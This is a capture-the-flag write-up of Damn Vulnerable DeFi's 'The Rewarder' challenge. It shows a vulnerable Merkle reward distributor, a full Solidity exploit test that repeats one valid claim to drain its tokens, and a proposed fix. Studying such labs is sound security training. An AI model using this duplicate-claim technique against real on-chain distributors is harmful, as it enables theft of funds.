---
title: "Damn Vulnerable Defi : The Rewarder"
date: 2025-05-14T19:15:00+01:00
---

In this article, we'll explore the "The Rewarder" challenge from Damn Vulnerable DeFi v4, dissecting a subtle yet critical vulnerability in a token distribution contract.
We'll examine Merkle-based token distribution systems, investigate how a single transaction can drain almost all tokens from a distributor, and understand the mechanics of this effective attack.

## The Challenge

The "The Rewarder" challenge presents us with a scenario where a distributor contract is responsible for distributing rewards of Damn Valuable Tokens (DVT) and WETH to eligible beneficiaries.

The challenge description states:

> A contract is distributing rewards of Damn Valuable Tokens and WETH.
>
> To claim rewards, users must prove they're included in the chosen set of beneficiaries. Don't worry about gas though. The contract has been optimized and allows claiming multiple tokens in the same transaction.
>
> Alice has claimed her rewards already. You can claim yours too! But you've realized there's a critical vulnerability in the contract.
>
> Save as much funds as you can from the distributor. Transfer all recovered assets to the designated recovery account.

Our objective is to identify the vulnerability in the distributor contract and exploit it to drain as many tokens as possible, transferring them to a recovery account.

## Understanding the Relevant Concepts

Before diving into the vulnerability, let's understand the key concepts that form the foundation of this distributor contract.

### Merkle Trees and Merkle Proofs

Merkle trees are a fundamental data structure in blockchain technology, allowing large sets of data to be efficiently verified. In the context of token distributions:

1. A list of beneficiaries and their entitled amounts are hashed and organized into a tree structure
2. The root of this tree (Merkle root) is stored on-chain
3. Users can prove they are part of the distribution by providing a Merkle proof – a minimal set of hashes needed to reconstruct the path from their leaf node to the root

This approach is gas-efficient as it only requires storing a single hash (the root) on-chain, while allowing any number of beneficiaries to prove their inclusion in the distribution.

### Bitmap-Based Claim Tracking

The distributor uses bitmaps to track which claims have already been processed. A bitmap is an efficient data structure that uses individual bits to represent boolean states (claimed or not claimed).

In this implementation:
- Each batch of distributions gets a bit position in a word
- When a claim is processed, the corresponding bit is flipped from 0 to 1
- This approach is significantly more gas-efficient than storing a mapping of booleans

### Batch Processing of Claims

One of the key optimizations in the distributor contract is the ability to process multiple claims in a single transaction. This reduces gas costs for users who are entitled to multiple rewards and improves the overall efficiency of the distribution process.

## The Vulnerable Contract

Let's examine the `TheRewarderDistributor` contract, focusing on the `claimRewards` function where the vulnerability resides:

```solidity
function claimRewards(Claim[] memory inputClaims, IERC20[] memory inputTokens) external {
    Claim memory inputClaim;
    IERC20 token;
    uint256 bitsSet; // accumulator
    uint256 amount;

    for (uint256 i = 0; i < inputClaims.length; i++) {
        inputClaim = inputClaims[i];

        uint256 wordPosition = inputClaim.batchNumber / 256;
        uint256 bitPosition = inputClaim.batchNumber % 256;

        if (token != inputTokens[inputClaim.tokenIndex]) {
            if (address(token) != address(0)) {
                if (!_setClaimed(token, amount, wordPosition, bitsSet)) revert AlreadyClaimed();
            }

            token = inputTokens[inputClaim.tokenIndex];
            bitsSet = 1 << bitPosition; // set bit at given position
            amount = inputClaim.amount;
        } else {
            bitsSet = bitsSet | 1 << bitPosition;
            amount += inputClaim.amount;
        }

        // for the last claim
        if (i == inputClaims.length - 1) {
            if (!_setClaimed(token, amount, wordPosition, bitsSet)) revert AlreadyClaimed();
        }

        bytes32 leaf = keccak256(abi.encodePacked(msg.sender, inputClaim.amount));
        bytes32 root = distributions[token].roots[inputClaim.batchNumber];

        if (!MerkleProof.verify(inputClaim.proof, root, leaf)) revert InvalidProof();

        inputTokens[inputClaim.tokenIndex].transfer(msg.sender, inputClaim.amount);
    }
}
```

The vulnerability lies in the order of operations within this function. Let's analyze the critical parts:

1. The function loops through all the claims in the `inputClaims` array
2. For each claim, it calculates the word and bit positions in the bitmap based on the batch number
3. If the token changes, it calls `_setClaimed()` to mark previous claims as processed
4. It verifies the Merkle proof to ensure the claimer is entitled to this reward
5. It transfers the tokens to the claimer
6. Only after transferring the tokens does it set the claims as processed (via `_setClaimed()`)

The issue is that tokens are transferred before the claims are marked as processed in the bitmap. This means that when processing multiple claims for the same token and batch in a single transaction, the contract doesn't properly check if these claims have already been processed until after all tokens are transferred.

## The Exploit

The vulnerability can be exploited by submitting multiple identical claims in a single transaction. Since the contract only marks claims as processed after all claims for a token are processed, we can claim the same reward multiple times.

Here's the exploit:

```solidity
function test_theRewarder() public checkSolvedByPlayer {
    // Load the reward distribution data
    bytes32[] memory dvtLeaves = _loadRewards(
        "/test/the-rewarder/dvt-distribution.json"
    );
    bytes32[] memory wethLeaves = _loadRewards(
        "/test/the-rewarder/weth-distribution.json"
    );

    // Get the raw reward data
    Reward[] memory dvtRewards = abi.decode(
        vm.parseJson(
            vm.readFile(
                string.concat(
                    vm.projectRoot(),
                    "/test/the-rewarder/dvt-distribution.json"
                )
            )
        ),
        (Reward[])
    );
    Reward[] memory wethRewards = abi.decode(
        vm.parseJson(
            vm.readFile(
                string.concat(
                    vm.projectRoot(),
                    "/test/the-rewarder/weth-distribution.json"
                )
            )
        ),
        (Reward[])
    );

    // Find the player's index in the distribution
    uint256 playerIndex;
    for (uint256 i = 0; i < BENEFICIARIES_AMOUNT; i++) {
        if (dvtRewards[i].beneficiary == player) {
            playerIndex = i;
            break;
        }
    }

    // Verify we found the player's index
    require(playerIndex != 0, "Player address not found in distribution");

    // Get the amounts the player can claim
    uint256 playerDVTAmount = dvtRewards[playerIndex].amount;
    uint256 playerWETHAmount = wethRewards[playerIndex].amount;

    // Calculate how many claims we can make
    uint256 dvtTxCount = TOTAL_DVT_DISTRIBUTION_AMOUNT / playerDVTAmount;
    uint256 wethTxCount = TOTAL_WETH_DISTRIBUTION_AMOUNT / playerWETHAmount;
    uint256 totalTxCount = dvtTxCount + wethTxCount;

    // Prepare the tokens array
    IERC20[] memory tokens = new IERC20[](2);
    tokens[0] = IERC20(address(dvt));
    tokens[1] = IERC20(address(weth));

    // Generate Merkle proofs for the player (only once)
    bytes32[] memory dvtProof = merkle.getProof(dvtLeaves, playerIndex);
    bytes32[] memory wethProof = merkle.getProof(wethLeaves, playerIndex);

    // Build all claims
    Claim[] memory claims = new Claim[](totalTxCount);

    for (uint256 i = 0; i < totalTxCount; i++) {
        if (i < dvtTxCount) {
            claims[i] = Claim({
                batchNumber: 0,
                amount: playerDVTAmount,
                tokenIndex: 0, // DVT
                proof: dvtProof
            });
        } else {
            claims[i] = Claim({
                batchNumber: 0,
                amount: playerWETHAmount,
                tokenIndex: 1, // WETH
                proof: wethProof
            });
        }
    }

    // Execute all claims in a single transaction
    distributor.claimRewards(claims, tokens);

    // Transfer all recovered tokens
    dvt.transfer(recovery, dvt.balanceOf(player));
    weth.transfer(recovery, weth.balanceOf(player));
}
```

Let's break down this exploit step-by-step:

1. We load the Merkle distribution data for both DVT and WETH tokens
2. We find our address in the distribution to determine our legitimate reward amount
3. We calculate how many times we can repeat our claim to drain almost all tokens from the distributor
4. We prepare an array of `Claim` objects, where each claim is identical and references the same batch number, amount, and Merkle proof
5. We submit all these claims in a single transaction to the `claimRewards` function
6. The function processes each claim in sequence, transferring tokens each time without marking the claims as processed until the end
7. By the time the function attempts to mark the claims as processed, we've already received multiple rewards
8. We transfer all drained tokens to the recovery address

## How It Works Under the Hood

To understand why this exploit works, let's examine what happens inside the `claimRewards` function when processing our array of claims:

1. The function starts with an empty `token` variable and zero `bitsSet` and `amount` accumulators
2. For the first claim:
   - Since `token` is empty, it sets `token` to DVT, `bitsSet` to the bit for batch 0, and `amount` to our DVT reward amount
   - It verifies our Merkle proof (which is valid)
   - It transfers the DVT tokens to us
3. For subsequent claims with the same token (DVT):
   - It doesn't set claims as processed yet because we're still on the same token
   - It updates `bitsSet` to include the new bit (same as before)
   - It adds the amount to the accumulator
   - It again verifies our Merkle proof and transfers more DVT tokens
4. This repeats for all DVT claims
5. When we switch to WETH claims:
   - It finally calls `_setClaimed()` for all the DVT claims, which marks them as processed in the bitmap
   - But we've already received all the DVT tokens!
6. The process repeats for WETH claims
7. At the end, it calls `_setClaimed()` for the WETH claims, but again, we've already received all the tokens

The key insight is that the contract's attempt to optimize gas by batching claims for the same token introduces a critical vulnerability in the claim verification process.

## What Happens in the _setClaimed() Function

Let's look at the `_setClaimed()` function to understand the final piece of the puzzle:

```solidity
function _setClaimed(IERC20 token, uint256 amount, uint256 wordPosition, uint256 newBits) private returns (bool) {
    uint256 currentWord = distributions[token].claims[msg.sender][wordPosition];
    if ((currentWord & newBits) != 0) return false;

    // update state
    distributions[token].claims[msg.sender][wordPosition] = currentWord | newBits;
    distributions[token].remaining -= amount;

    return true;
}
```

This function:
1. Retrieves the current word from the bitmap for the given token, claimer, and word position
2. Checks if any of the bits in `newBits` are already set in `currentWord` (indicating a claim has already been processed)
3. If any bits are already set, it returns `false`, causing the transaction to revert
4. Otherwise, it updates the bitmap and reduces the remaining token amount

The problem is that this function is only called once per token in our batch of claims, not once per individual claim. This is what allows our exploit to succeed.

## How to Fix the Vulnerability

We can modify the function to verify if each claim has already been processed before transferring tokens.

```solidity
function claimRewards(Claim[] memory inputClaims, IERC20[] memory inputTokens) external {
    // ... existing code ...

    for (uint256 i = 0; i < inputClaims.length; i++) {
        inputClaim = inputClaims[i];

        // Check if this specific claim has already been processed
        uint256 wordPosition = inputClaim.batchNumber / 256;
        uint256 bitPosition = inputClaim.batchNumber % 256;
        uint256 bit = 1 << bitPosition;
        uint256 currentWord = distributions[inputTokens[inputClaim.tokenIndex]].claims[msg.sender][wordPosition];

        // If bit is already set, this claim has already been processed
        if ((currentWord & bit) != 0) revert AlreadyClaimed();

        // ... rest of the function ...

        // Mark this specific claim as processed immediately after verification
        distributions[inputTokens[inputClaim.tokenIndex]].claims[msg.sender][wordPosition] |= bit;

        // Verify Merkle proof and transfer tokens
        // ... existing code ...
    }
}
```

## Conclusion

The "The Rewarder" challenge from Damn Vulnerable DeFi illustrates how optimizations for gas efficiency can sometimes introduce critical security vulnerabilities. The attempt to batch process claims for the same token created a race condition between token transfers and claim verification.

This vulnerability highlights several important lessons for smart contract developers:

1. **Order of operations matters**: Always validate and update state before transferring assets.
2. **Optimizations can introduce vulnerabilities**: Gas optimizations, while important, should never compromise security.
3. **Test edge cases thoroughly**: Special attention should be paid to functions that process batches or arrays of transactions.
4. **Respect the checks-effects-interactions pattern**: A classic smart contract pattern that dictates performing all checks first, then state changes, and external interactions last.

In DeFi, where millions of dollars can be at stake, even the smallest vulnerabilities can lead to catastrophic losses. The "The Rewarder" challenge serves as a reminder of the importance of rigorous security practices when dealing with financial contracts on the blockchain.
